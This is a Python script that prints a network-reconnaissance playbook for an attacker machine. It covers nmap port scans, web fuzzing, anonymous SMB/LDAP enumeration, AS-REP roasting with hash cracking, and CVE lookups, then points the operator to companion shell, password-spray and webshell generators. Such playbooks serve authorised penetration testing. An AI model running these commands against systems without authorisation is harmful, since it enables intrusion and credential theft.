#!/usr/bin/env python3
"""NETWORK RECON — drives nmap/nuclei/netexec + per-service deep enum into a target profile, and
self-recommends the access bucket for each finding (==> run gen_xxx). PRINTS commands (attacker box).

Usage:
  python3 enum_net.py --target 10.0.0.5              # single host, full sweep
  python3 enum_net.py --range 10.0.0.0/24            # discover live hosts first
  python3 enum_net.py --target 10.0.0.5 --web        # deep web enum only
  python3 enum_net.py --target 10.0.0.5 --smb        # deep SMB/AD enum only
"""
import sys
import _network_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default
def has(flag): return flag in sys.argv

t     = opt("--target", opt("--range", "<target>"))
only  = [f[2:] for f in ("--web", "--smb", "--ad", "--vuln") if has(f)]

if has("--range"):
    print("# ===== HOST DISCOVERY (find live hosts) =====")
    print(f"# needs: L2/L3 reach to {t} (VPN/on-subnet). <target> = a CIDR or IP range.")
    print(f"nmap -sn {t} -oA hosts            # (try first) ping sweep; or -Pn if ICMP filtered")
    print(f"nxc smb {t}                       # SMB sweep: names/OS/signing/domain in one shot")
    print(f"fping -a -g {t} 2>/dev/null       # quick alive list")
    print(f"# -> ok: you get a list of responding IPs — feed each into the per-host scan below.\n")

if not only:
    print(f"# ===== PORT / SERVICE SCAN  target={t} =====")
    print(f"# needs: reach to {t}. Run 1 -> 2 -> 3 in order (2 needs the open set from 1).")
    print(f"nmap -Pn -p- --min-rate 3000 {t} -oA allports        # 1) all TCP ports, fast")
    print(f"nmap -Pn -sCV -p <open,from,above> {t} -oA services   # 2) version + default scripts on the open set")
    print(f"nmap -Pn -sU --top-ports 50 {t} -oA udp               # 3) top UDP (SNMP/DNS/IKE/etc.)")
    print(f"# -> ok: step 1 prints the open TCP port list; put those ports into <open,from,above> for step 2.")
    print(f"# ==> map each open port to its follow-up below (SERVICES table):")
    for port, (name, hint) in sorted(P.SERVICES.items()):
        print(f"#     {port:<6}{name:<10}{hint}")
    print()

if "web" in only or not only:
    print("# ===== WEB (80/443/8080/8443…) =====")
    print(f"# needs: an HTTP/S service open on {t} (80/443/8080/8443…).")
    print(f"whatweb http://{t}; curl -sI http://{t}                    # (try first) fingerprint stack/headers")
    print(f"httpx -u http://{t} -title -tech-detect -status-code       # (ProjectDiscovery) tech + title")
    print(f"nuclei -u http://{t} -severity critical,high               # known-CVE/exposure scan")
    print(f"ffuf -u http://{t}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,401,403")
    print(f"feroxbuster -u http://{t} -x php,asp,aspx,jsp,txt,bak       # recursive content discovery")
    print(f"# -> ok: nuclei prints a [critical]/[high] finding, or ffuf/ferox returns a 200/401/403 path worth pursuing.")
    print(f"# check: /robots.txt /.git/ /.env /backup* /admin login pages · default creds · known-CVE")
    print(f"# ==> exposed .git/.env/backup = gen_web (exposed-secret) · a login = gen_spray (http) · SQLi/upload/RCE = gen_web\n")

if "smb" in only or "ad" in only or not only:
    print("# ===== SMB / AD (445/139/389/88) =====")
    print(f"# needs: 445/139 (SMB) reachable on {t}; LDAP/Kerberos steps need 389/88 (a Domain Controller).")
    print(f"nxc smb {t} -u '' -p '' --shares                 # (try first) NULL session: shares readable anonymously?")
    print(f"nxc smb {t} -u guest -p '' --shares --users      # then guest access")
    print(f"enum4linux-ng -A {t}                             # users/groups/shares/policy (needs SMB)")
    print(f"nxc smb {t} -u <user> -p <pass> --pass-pol       # LOCKOUT POLICY — read BEFORE any spray!")
    print(f"nxc ldap {t} -u '' -p '' 2>/dev/null             # anonymous LDAP bind -> domain/user enum")
    print(f"# -> ok: null/guest session lists shares or users -> that user list feeds gen_spray / AS-REP roast below.")
    print(f"# AD user enum (no creds): kerbrute userenum -d {P.DOMAIN or '<domain>'} --dc {t} users.txt")
    print(f"# AS-REP roast — needs: a candidate users file (users.txt) + a reachable DC. Hits = users with preauth OFF:")
    print(f"# AS-REP roast (no creds, users w/ preauth off): GetNPUsers.py {P.DOMAIN or '<dom>'}/ -dc-ip {t} -usersfile users.txt -no-pass")
    print(f"# -> ok: GetNPUsers prints a $krb5asrep$ hash -> crack it (hashcat -m 18200) -> a valid domain cred.")
    print(f"# ==> shares/creds found = gen_shell · users list = gen_spray (smb) · AS-REP hash = crack -> gen_shell\n")

if "vuln" in only or not only:
    print("# ===== VERSION -> KNOWN-CVE (Bucket A) =====")
    print(f"# needs: an exact product+version from the -sCV scan above to match against a CVE range.")
    print(f"nuclei -u {t} -severity critical,high             # broad known-exposure/CVE")
    print(f"searchsploit <service> <version>                  # match a service+version to a public exploit")
    print(f"nxc smb {t} -u '' -p '' | grep -i 'signing:False' # relay candidate; also check EternalBlue/SMBGhost by version")
    print(f"# -> ok: nuclei/searchsploit names a CVE for the exact version, or grep shows 'signing:False' (relay target).")
    print(f"# ==> a matched service-CVE = gen_exploit (supply the PoC, version-match first)\n")

print("# ===== NEXT =====")
print("#  creds you found  -> gen_shell.py   (turn them into a shell = the privesc foothold)")
print("#  a user list only -> gen_spray.py      (spray a password; MIND THE LOCKOUT POLICY above)")
print("#  a web app        -> gen_web.py        (SQLi->xp_cmdshell / upload->webshell / RCE)")
print("#  a service+CVE    -> gen_exploit.py    (public-service exploit)")
